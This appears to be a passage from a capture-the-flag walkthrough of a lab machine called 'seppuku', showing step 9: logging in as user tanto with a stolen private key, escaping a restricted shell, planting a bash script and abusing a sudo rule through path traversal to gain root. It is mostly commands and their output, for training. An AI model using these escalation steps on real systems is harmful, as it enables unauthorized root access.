# 9 ssh tanto > privesc > root

```
# tanto has id_rsa.pub and authorized_keys under /home/tanto/.ssh/
# the private key we have from earlier could be used
# again rbash

$ ssh -i private.key tanto@192.168.131.90 -t "bash --noprofile"

tanto@seppuku:~$ mkdir .cgi_bin; cd .cgi_bin

tanto@seppuku:~/.cgi_bin$ echo "/bin/bash" > bin
tanto@seppuku:~/.cgi_bin$ chmod 777 bin
```

### Running as samurai

```
samurai@seppuku:/home/tanto/.ssh$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
root@seppuku:/home/tanto/.ssh# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
seppuku
```
